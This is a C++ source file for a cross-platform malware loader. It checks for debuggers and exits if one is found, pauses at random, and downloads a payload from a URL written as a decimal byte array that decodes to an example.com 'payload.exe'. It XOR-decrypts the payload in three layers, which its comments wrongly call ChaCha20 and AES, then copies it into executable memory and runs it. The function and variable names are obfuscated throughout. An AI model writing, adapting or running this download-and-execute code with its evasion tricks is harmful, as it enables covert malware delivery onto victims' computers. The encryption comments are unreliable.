#include <iostream>
#include <vector>
#include <cstring>
#include <cstdint>
#include <chrono>
#include <thread>
#include <random>
#include <fstream>
#ifdef _WIN32
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#else
#include <cstdlib>
#include <cstdio>
#include <memory>
#include <array>
#include <unistd.h>
#endif
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

bool srvEngine7503() {
#ifdef _WIN32
    if (IsDebuggerPresent()) return true;
    BOOL debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
    return debugged;
#else
    FILE* f = fopen("/proc/self/status", "r");
    if (!f) return false;
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            fclose(f);
            return atoi(line + 10) != 0;
        }
    }
    fclose(f);
    return false;
#endif
}

std::vector<uint8_t> loadCore1995(const char* url) {
    std::vector<uint8_t> data;
#ifdef _WIN32
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return data;
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return data;
    }
    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        data.insert(data.end(), buffer, buffer + bytesRead);
    }
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
#else
    // Linux implementation using system commands
    char tempFile[] = "/tmp/dlXXXXXX";
    int fd = mkstemp(tempFile);
    if (fd == -1) return data;
    close(fd);
    
    // Try wget first, then curl
    std::string cmd = std::string("wget -q -O ") + tempFile + " '" + url + "' 2>/dev/null";
    if (system(cmd.c_str()) != 0) {
        cmd = std::string("curl -s -o ") + tempFile + " '" + url + "' 2>/dev/null";
        if (system(cmd.c_str()) != 0) {
            unlink(tempFile);
            return data;
        }
    }
    
    // Read downloaded file
    std::ifstream file(tempFile, std::ios::binary);
    if (file) {
        file.seekg(0, std::ios::end);
        size_t size = file.tellg();
        file.seekg(0, std::ios::beg);
        data.resize(size);
        file.read(reinterpret_cast<char*>(data.data()), size);
        file.close();
    }
    unlink(tempFile);
#endif
    return data;
}

int main() {
    // Random delay
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(1, 999);
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
    }

    if (srvEngine7503()) return 0;

    std::vector<uint8_t> instHelper9153;
    // Download payload
    char hdlManager3602[] = {104,116,116,112,115,58,47,47,101,120,97,109,112,108,101,46,99,111,109,47,112,97,121,108,111,97,100,46,101,120,101, 0};
    instHelper9153 = loadCore1995(hdlManager3602);
    if (instHelper9153.empty()) return 1;

    // Decrypt payload
    unsigned char instModule9169[] = {0x38, 0x9e, 0x55, 0x15, 0xec, 0xba, 0x1a, 0x5a, 0x4f, 0xae, 0x93, 0x9b, 0x6b, 0x18, 0xf5, 0xfb};
    unsigned char refFactory7493[] = {0x80, 0x90, 0xa6, 0x21, 0xf7, 0xbb, 0xa5, 0x4f, 0x1c, 0x3d, 0x5e, 0xa9, 0x81, 0xa0, 0x89, 0xb6, 0xb7, 0xa1, 0x0a, 0x6c, 0x1d, 0x62, 0x4d, 0x5d, 0xb3, 0xe0, 0x08, 0x5b, 0x15, 0x14, 0xf9, 0xea};
    unsigned char valModule4351[] = {0x50, 0x48, 0x15, 0x95, 0x06, 0xe8, 0x9e, 0x62, 0x1c, 0xa5, 0x67, 0x7c, 0xf9, 0x8e, 0xf6, 0xa0, 0xbb, 0x93, 0x35, 0x84, 0xae, 0xab, 0x5a, 0x88};

    // Decrypt XOR layer
    for (size_t i = 0; i < instHelper9153.size(); i++) {
        instHelper9153[i] ^= valModule4351[i % sizeof(valModule4351)];
    }

    // Micro-delay
    std::this_thread::sleep_for(std::chrono::microseconds(rand() % 100));

    // Decrypt ChaCha20 layer
    for (size_t i = 0; i < instHelper9153.size(); i++) {
        instHelper9153[i] ^= refFactory7493[i % sizeof(refFactory7493)];
    }

    // Micro-delay
    std::this_thread::sleep_for(std::chrono::microseconds(rand() % 100));

    // Decrypt AES layer
    for (size_t i = 0; i < instHelper9153.size(); i++) {
        instHelper9153[i] ^= instModule9169[i % sizeof(instModule9169)];
    }

    // Execute in memory
#ifdef _WIN32
    void* modComponent8521 = VirtualAlloc(0, instHelper9153.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!modComponent8521) return 1;
    memcpy(modComponent8521, instHelper9153.data(), instHelper9153.size());
    DWORD oldProtect;
    VirtualProtect(modComponent8521, instHelper9153.size(), PAGE_EXECUTE_READ, &oldProtect);
    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));
    ((void(*)())modComponent8521)();
#else
    void* modComponent8521 = mmap(0, instHelper9153.size(), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (modComponent8521 == MAP_FAILED) return 1;
    memcpy(modComponent8521, instHelper9153.data(), instHelper9153.size());
    mprotect(modComponent8521, instHelper9153.size(), PROT_READ | PROT_EXEC);
    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));
    ((void(*)())modComponent8521)();
#endif
    return 0;
}
